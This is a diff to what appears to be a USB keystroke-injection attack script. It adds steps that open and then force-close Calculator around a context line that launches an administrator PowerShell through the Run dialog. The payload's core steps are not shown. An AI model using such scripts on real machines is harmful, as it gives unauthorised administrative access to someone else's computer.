@@ -7,7 +7,11 @@ Q DELAY 5000
 
 #Start the attack
 LED ATTACK
-Q REM Open an admin command prompt
+Q GUI r
+Q DELAY 500
+Q STRING calc
+Q ENTER
+Q DELAY 500
 Q GUI r
 Q DELAY 500
 Q STRING powershell Start-Process powershell -Verb runAs
@@ -47,6 +51,11 @@ Q ENTER
 Q DELAY 1250
 Q STRING exit
 Q ENTER
+Q GUI r
+Q DELAY 500
+Q STRING taskkill /im Calculator.exe /f
+Q ENTER
+Q DELAY 500
 
 #Finish
 LED FINISH
